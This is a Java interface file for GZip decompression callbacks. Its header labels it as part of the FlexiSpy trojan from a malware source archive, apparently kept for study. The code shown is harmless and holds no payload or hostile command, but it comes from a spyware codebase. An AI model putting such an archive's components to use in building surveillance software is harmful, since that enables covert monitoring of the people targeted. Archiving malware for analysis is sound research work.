/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.compression;


public interface GZipDecompressListener {

	public void DecompressCompleted();

	public void DecompressError(String errorMsg);
		
}
